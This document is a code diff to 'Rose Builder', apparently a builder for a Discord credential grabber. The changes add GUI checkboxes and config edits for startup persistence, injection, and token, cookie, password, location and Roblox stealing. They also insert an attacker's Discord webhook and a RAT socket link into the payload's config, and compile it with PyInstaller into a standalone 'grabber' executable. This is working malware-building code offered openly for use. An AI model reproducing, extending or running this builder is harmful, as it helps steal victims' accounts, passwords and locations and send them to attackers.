@@ -20,12 +20,22 @@ try:
     from pathlib import Path
     from dhooks import Webhook, Embed
     from PyQt5 import QtCore, QtGui, QtWidgets
-    from PyQt5.QtCore import QRunnable, Qt, QThreadPool
+    from PyQt5.QtCore import QRunnable, QThreadPool, QObject, pyqtSignal as Signal, pyqtSlot as Slot
     import os
-except:
+    import shutil
+    import ctypes
+except Exception as e:
+    print(e)
     import subprocess
     subprocess.run("python -m pip install requests && python -m pip install beautifulsoup4 && python -m pip install PyQt5 && python -m pip install pypiwin32")
 
+class Signals(QObject):
+    create_dirc = Signal()
+    make_reqc = Signal()
+    edit_configc = Signal()
+    compilec = Signal()
+    move_dirc = Signal()
+    build_done = Signal()
 
 class Runnable(QRunnable):
     def __init__(self, n, webhook_url):
@@ -43,20 +53,37 @@ class Runnable(QRunnable):
         embed.set_footer(text="Rose Builder | By pierro, suegdu, Gumbobrot, svn", icon_url=__icon__)
         hook.send(embed=embed)
             
-class Runnable_wf(QRunnable):
+class Runnable_wf(QRunnable):    
     def __init__(
         self, n,
         dir_name,
         webhook_url,
         rat_checked,
-        rat_link
+        rat_link,
+        is_startup,
+        is_injection,
+        is_tokensteal,
+        is_cookiesteal,
+        is_passwordsteal,
+        is_malicioussteal,
+        is_locationssteal,
+        is_robloxsteal
     ):        
         super().__init__()
+        self.signals = Signals()
         self.n = n
         self.dir_name = dir_name
         self.webhook_url = webhook_url
         self.rat_checked = rat_checked
         self.rat_link = rat_link
+        self.is_startup = is_startup
+        self.is_injection = is_injection
+        self.is_tokensteal = is_tokensteal
+        self.is_cookiesteal = is_cookiesteal
+        self.is_passwordsteal = is_passwordsteal
+        self.is_malicioussteal = is_malicioussteal
+        self.is_locationssteal = is_locationssteal
+        self.is_robloxsteal = is_robloxsteal
         
     def create_dir(self):
         self.path = f"{Path(__file__).resolve().parent}\\{self.dir_name}"
@@ -74,11 +101,7 @@ class Runnable_wf(QRunnable):
     def edit_config(self):
         with open(f"{self.path}\\config.py","r",encoding="utf-8") as f:
             text = f.read()
-            new = text.replace("HOOK", f"{self.webhook_url}").replace("discord_rat = False", f"discord_rat = {str(self.rat_checked)}").replace("DISCORD_RAT_SOCKET_LINK", f"{self.rat_link}")
-            """text.replace("HOOK", f"{self.webhook_url}")
-            text.replace("discord_rat = False", f"discord_rat = {str(self.rat_checked)}")
-            text.replace("DISCORD_RAT_SOCKET_LINK", f"{self.rat_link}")
-            """
+            new = text.replace("HOOK", f"{self.webhook_url}").replace("discord_rat = False", f"discord_rat = {str(self.rat_checked)}").replace("DISCORD_RAT_SOCKET_LINK", f"{self.rat_link}").replace("startup = False", f"startup = {self.is_startup}").replace("self.injection = False", f"self.injection = {self.is_injection}").replace("self.token_stealing = False", f"self.token_stealing = {self.is_tokensteal}").replace("cookie_stealing = False", f"cookie_stealing = {self.is_cookiesteal}").replace("password_stealing = False", f"password_stealing = {self.is_passwordsteal}").replace("malicious_stealing = False", f"malicious_stealing = {self.is_malicioussteal}").replace("location_stealing = False", f"location_stealing = {self.is_locationssteal}").replace("roblox_stealing = False", f"roblox_stealing = {self.is_robloxsteal}")
         print(new)
         with open(f"{self.path}\\config.py", "w", encoding="utf-8") as f:
             f.write(new)
@@ -96,14 +119,27 @@ class Runnable_wf(QRunnable):
     def compile(self):
         os.system(f'pyinstaller --noconfirm --onefile --windowed  "{self.path}/main.py"')
         
+    def move_dir(self): 
+        shutil.move(f"dist\\main.exe", f"{self.dir_name}.exe")
+        shutil.rmtree('build')
+        shutil.rmtree('dist')
+        os.remove(f"main.spec")
+        
+        
 
     def run(self):
         try:
-            print(str(self.rat_checked))
+            self.signals.create_dirc.emit()
             self.create_dir()
+            self.signals.make_reqc.emit()
             self.make_req()
+            self.signals.edit_configc.emit()
             self.edit_config()
+            self.signals.compilec.emit()
             self.compile()
+            self.signals.move_dirc.emit()
+            self.move_dir()
+            self.signals.build_done.emit()
         except Exception as e:
             print(e)
 
@@ -173,6 +209,19 @@ class Ui_MainWindow_vailB(object):
         self.CB_passsteal = QtWidgets.QCheckBox(self.groupBox_8)
         self.CB_passsteal.setGeometry(QtCore.QRect(20, 100, 161, 17))
         self.CB_passsteal.setObjectName("CB_passsteal")
+        
+        self.CB_malicioussteal = QtWidgets.QCheckBox(self.groupBox_8)
+        self.CB_malicioussteal.setGeometry(QtCore.QRect(20, 120, 161, 17))
+        self.CB_malicioussteal.setObjectName("CB_malicioussteal")
+        
+        self.CB_locationsteal = QtWidgets.QCheckBox(self.groupBox_8)
+        self.CB_locationsteal.setGeometry(QtCore.QRect(110, 20, 70, 17))
+        self.CB_locationsteal.setObjectName("CB_locationsteal")
+        
+        self.CB_robloxsteal = QtWidgets.QCheckBox(self.groupBox_8)
+        self.CB_robloxsteal.setGeometry(QtCore.QRect(110, 40, 70, 17))
+        self.CB_robloxsteal.setObjectName("CB_robloxsteal")
+        
         self.groupBox_10 = QtWidgets.QGroupBox(self.groupBox_8)
         self.groupBox_10.setGeometry(QtCore.QRect(10, 210, 231, 81))
         self.groupBox_10.setObjectName("groupBox_10")
@@ -283,6 +332,7 @@ class Ui_MainWindow_vailB(object):
         self.B_vail_repo.clicked.connect(self.github)
         self.B_build.clicked.connect(self.pb_build) # connect a function to the push button by doing this so (All push buttons are described as B_.. then the identifier.)
         QtCore.QMetaObject.connectSlotsByName(MainWindow_vailB)
+        
     def retranslateUi(self, MainWindow_vailB):
         _translate = QtCore.QCoreApplication.translate
         MainWindow_vailB.setWindowTitle(_translate("MainWindow_vailB", f"Rose Builder {__version__}"))
@@ -295,9 +345,12 @@ class Ui_MainWindow_vailB(object):
         self.groupBox_8.setTitle(_translate("MainWindow_vailB", "Settings"))
         self.CB_startup.setText(_translate("MainWindow_vailB", "Startup"))
         self.CB_injection.setText(_translate("MainWindow_vailB", "Injection"))
-        self.CB_tokensteal.setText(_translate("MainWindow_vailB", "Token Stealing"))
-        self.CB_cookiesteal.setText(_translate("MainWindow_vailB", "Cookie Stealing"))
-        self.CB_passsteal.setText(_translate("MainWindow_vailB", "Password Stealing"))
+        self.CB_tokensteal.setText(_translate("MainWindow_vailB", "Token"))
+        self.CB_cookiesteal.setText(_translate("MainWindow_vailB", "Cookie"))
+        self.CB_passsteal.setText(_translate("MainWindow_vailB", "Password"))
+        self.CB_malicioussteal.setText(_translate("MainWindow_vailB", "Malicious"))
+        self.CB_locationsteal.setText(_translate("MainWindow_vailB", "Location"))
+        self.CB_robloxsteal.setText(_translate("MainWindow_vailB", "Roblox"))
         self.groupBox_10.setTitle(_translate("MainWindow_vailB", "Ping Method"))
         self.comboBox.setItemText(0, _translate("MainWindow_vailB", "everyone"))
         self.comboBox.setItemText(1, _translate("MainWindow_vailB", "here"))
@@ -343,38 +396,61 @@ class Ui_MainWindow_vailB(object):
         webbrowser.open("https://github.com/suvan1911")
     def github(self):
         webbrowser.open(__repo__)
-
-    def prorsload(self):
-        for i in range(99):
-            time.sleep(00.001)
-            self.progressBar.setProperty("value", i+1)
-    def prorsunload(self):
-        self.progressBar.setProperty("value",0)
-
-    # The progressBar manager Use the following arguments for execution: mode = "start" will load it fully till you call the stopping argument: mode = "stop",
-    # For calling it once to unload afterwards use the argument: mode = 0 (int).
-    def prorsmng(self,mode):
-        if mode=="start":
-            self.prorsload()
-        elif mode=="stop":
-            self.prorsunload()
-        elif mode==0:
-            self.prorsload()
-            self.prorsunload()
+            
     def clearconsole(self):
         self.console_0.clear()
+        self.progressBar.setProperty("value", 0)
 
-    def writesource(self):
+    def writesource(self):        
         pool = QThreadPool.globalInstance()
-        runnable = Runnable_wf(
+        worker = Runnable_wf(
             1,
             self.dir_name_input.text(),
             self.LE_webhook_url.text(),
             self.CB_rat.isChecked(),
-            self.LE_ratsserver.text()
+            self.LE_ratsserver.text(),
+            self.CB_startup.isChecked(),
+            self.CB_injection.isChecked(),
+            self.CB_tokensteal.isChecked(),
+            self.CB_cookiesteal.isChecked(),
+            self.CB_passsteal.isChecked(),
+            self.CB_malicioussteal.isChecked(),
+            self.CB_locationsteal.isChecked(),
+            self.CB_robloxsteal.isChecked()
         )
-        pool.start(runnable)
+        worker.signals.create_dirc.connect(self.create_dirc)
+        worker.signals.make_reqc.connect(self.make_reqc)
+        worker.signals.edit_configc.connect(self.edit_configc)
+        worker.signals.compilec.connect(self.compilec)
+        worker.signals.move_dirc.connect(self.move_dirc)
+        worker.signals.build_done.connect(self.build_done)
+        
+        pool.start(worker)
 
+    def create_dirc(self):
+        self.progressBar.setProperty("value", 0)
+        self.console_write("Creating new directory...")
+    
+    def make_reqc(self):
+        self.progressBar.setProperty("value", 20)
+        self.console_write("Fetching files...")
+    
+    def edit_configc(self):
+        self.progressBar.setProperty("value", 40)
+        self.console_write("Editing the config...")
+        
+    def compilec(self):
+        self.progressBar.setProperty("value", 60)
+        self.console_write("Compiling | This can take a few minutes")
+    
+    def move_dirc(self):
+        self.progressBar.setProperty("value", 80)
+        self.console_write("Moving files...")
+        
+    def build_done(self):
+        self.progressBar.setProperty("value", 100)
+        self.console_write("\nFinished building the grabber.")
+        ctypes.windll.user32.MessageBoxW(0, "Successfuly built the grabber", "Rose Injector", 0)
 
     def test_hook(self):
         vfi = "discord.com/api"
@@ -402,17 +478,14 @@ class Ui_MainWindow_vailB(object):
                 self.console_write("Error: No RAT URL provided.")
                 return
         
-        self.console_write("\nStarted building....")
-        self.prorsmng("start")
-        self.console_write("\nRequesting Source....")
-        self.writesource() # <------ during the function procedure it passes its call
-        # and skips directly to console_write("Writing Source....") due to its threadining, will do so to
-        # all listed functions below which will cause a chaos. Must fix -suegdu
+        self.console_write("\nStarted building....\n")
+        self.writesource()
 
-        self.console_write("Writing Source....") 
-        # function something
-        self.prorsmng("stop")
 
+
+
+
+    
 
 if __name__ == "__main__":
     import sys
